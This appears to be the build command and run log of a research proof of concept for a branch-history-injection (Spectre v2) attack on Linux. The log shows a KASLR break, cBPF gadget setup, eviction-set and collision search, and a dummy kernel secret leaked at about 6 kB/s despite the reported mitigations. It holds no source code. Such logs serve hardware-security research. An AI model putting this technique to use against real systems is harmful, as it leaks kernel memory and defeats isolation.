performance
gcc -lm -o main main.c snippet.S flush_and_reload.c colliding_bhb.c cbpf.c ../../common/l2_eviction/evict_l2.c ../../common/kaslr_prefetch/kaslr_prefetch.c -g -O3 -Wno-unused-function -lrt -lm -no-pie -DINTEL_11_GEN
================== ENVIRONMENT INFO ===================
Model name: 11th Gen Intel(R) Core(TM) i7-11700 @ 2.50GHz
Linux version: 6.8.0-38-generic
Linux spectre_v2 mitigation info:
- Enhanced / Automatic IBRS; IBPB: conditional; RSB filling; PBRSB-eIBRS: SW sequence; BHI: SW loop, KVM: SW loop
Seed: 1745766605
======== Initialize KASLR Prefetch Side-Channel =======
           | min |  q1 | med |  q3 | max
  overhead |  16 |  18 |  20 |  20 |  22
    mapped |  16 |  18 |  20 |  20 |  22
  unmapped |  26 |  28 |  28 |  30 |  32
Threshold: 23, accuracy:
            hit| mis
    mapped  100|   0
  unmapped    0| 100
    Direct Map Start: 0xffff8a5ac0000000
   Kernel Text Start: 0xffffffffafa00000
Security List(evict): 0xffffffffb1749688
          TFP Target: 0xffffffffafc3c2ad
Total number of BPF instructions for victim: 1180
Total number of BPF instructions for train: 791
cBPF succesfully created!
------------------------------------------------------
Finding eviction set for syscall table
------------------------------------------------------
-----------------------------------------------------------------------------
Finding huge page kernel address
-----------------------------------------------------------------------------
Allocating 256 huge pages...
Testing Kernel Huge Page: 0xffff8a5b88000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5b8c000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5b90000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5b94000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5b98000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5b9c000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5ba0000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5ba4000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5ba8000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bac000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bb0000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bb4000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bb8000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bbc000000 (phys_map start +  3GB)Testing Kernel Huge Page: 0xffff8a5bc0000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bc4000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bc8000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bcc000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bd0000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bd4000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bd8000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bdc000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5be0000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5be4000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5be8000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bec000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bf0000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bf4000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bf8000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5bfc000000 (phys_map start +  4GB)Testing Kernel Huge Page: 0xffff8a5c00000000 (phys_map start +  5GB)Testing Kernel Huge Page: 0xffff8a5c04000000 (phys_map start +  5GB)Testing Kernel Huge Page: 0xffff8a5c08000000 (phys_map start +  5GB)Testing Kernel Huge Page: 0xffff8a5c0c000000 (phys_map start +  5GB)Testing Kernel Huge Page: 0xffff8a5c10000000 (phys_map start +  5GB)Iteration: 140
      User Huge Page:     0x74337e400000 |     Kernel Huge Page: 0xffff8a5c12000000
         User FR_BUF:     0x74337e402000 |        Kernel FR_BUF: 0xffff8a5c12002000
------------------------------------------------------
Find a colliding history for the victim -> target
------------------------------------------------------
Tries: 10000
>> Found collision in 14682 tries (3/5 hits)
   Verification: 19998/20000 hits
User huge page addr: 0x74337e400000 Kernel huge page addr: 0xffff8a5c12000000
[+] Step took: 23 sec
------------------------------------------------------
   1LD   2LDS   3LDS
 99992  99989  99996 
 99989  99997  99988 
 99996  99997  99996 
 99994  99991  99994 
 99994  99994  99991 
 99993  99997  99990 
 99993  99994  99993 
 99994  99993  99990 
 99997  99994  99991 
 99991  99994  99996 
-----------------------------------------------------------------------------
 Leaking Dummy secret
-----------------------------------------------------------------------------
secret addr user: 0x000074337e403000
secret addr kern: 0xffff8a5c12003000
0xffff8a5c12003000 0x007: Found Byte: 0x41 (A) Used prefix: 0x00000000
0xffff8a5c12003001 0x008: Found Byte: 0x42 (B) Used prefix: 0x41000000000000
0xffff8a5c12003002 0x009: Found Byte: 0x43 (C) Used prefix: 0x42410000000000
0xffff8a5c12003003 0x00a: Found Byte: 0x44 (D) Used prefix: 0x43424100000000
0xffff8a5c12003004 0x00b: Found Byte: 0x45 (E) Used prefix: 0x44434241000000
0xffff8a5c12003005 0x00c: Found Byte: 0x46 (F) Used prefix: 0x45444342410000
0xffff8a5c12003006 0x00d: Found Byte: 0x47 (G) Used prefix: 0x46454443424100
0xffff8a5c12003007 0x00e: Found Byte: 0x48 (H) Used prefix: 0x47464544434241
0xffff8a5c12003008 0x00f: Found Byte: 0x49 (I) Used prefix: 0x48474645444342
0xffff8a5c12003009 0x010: Found Byte: 0x4a (J) Used prefix: 0x49484746454443
0xffff8a5c1200300a 0x011: Found Byte: 0x4b (K) Used prefix: 0x4a494847464544
0xffff8a5c1200300b 0x012: Found Byte: 0x4c (L) Used prefix: 0x4b4a4948474645
0xffff8a5c1200300c 0x013: Found Byte: 0x4d (M) Used prefix: 0x4c4b4a49484746
0xffff8a5c1200300d 0x014: Found Byte: 0x4e (N) Used prefix: 0x4d4c4b4a494847
0xffff8a5c1200300e 0x015: Found Byte: 0x4f (O) Used prefix: 0x4e4d4c4b4a4948
0xffff8a5c1200300f 0x016: Found Byte: 0x50 (P) Used prefix: 0x4f4e4d4c4b4a49
0xffff8a5c12003010 0x017: Found Byte: 0x51 (Q) Used prefix: 0x504f4e4d4c4b4a
0xffff8a5c12003011 0x018: Found Byte: 0x52 (R) Used prefix: 0x51504f4e4d4c4b
0xffff8a5c12003012 0x019: Found Byte: 0x53 (S) Used prefix: 0x5251504f4e4d4c
0xffff8a5c12003013 0x01a: Found Byte: 0x54 (T) Used prefix: 0x535251504f4e4d
0xffff8a5c12003014 0x01b: Found Byte: 0x55 (U) Used prefix: 0x54535251504f4e
0xffff8a5c12003015 0x01c: Found Byte: 0x56 (V) Used prefix: 0x5554535251504f
0xffff8a5c12003016 0x01d: Found Byte: 0x57 (W) Used prefix: 0x56555453525150
0xffff8a5c12003017 0x01e: Found Byte: 0x58 (X) Used prefix: 0x57565554535251
0xffff8a5c12003018 0x01f: Found Byte: 0x59 (Y) Used prefix: 0x58575655545352
-----------------------------------------------------------------------------
 Testing the leakage rate with 3 kB random values
-----------------------------------------------------------------------------
[                                                  ][.[..[...[....[.....[......[.......[........[.........[..........[...........[............[.............[..............[...............[................[.................[..................[...................[....................[.....................[......................[.......................[........................[.........................[..........................[...........................[............................[.............................[..............................[...............................[................................[.................................[..................................[...................................[....................................[.....................................[......................................[.......................................[........................................[.........................................[..........................................[...........................................[............................................[.............................................[..............................................[...............................................[................................................[.................................................[..................................................
3 kB took  0.5 seconds (6027.1 Byte/sec)
Fault rate: 0.000%
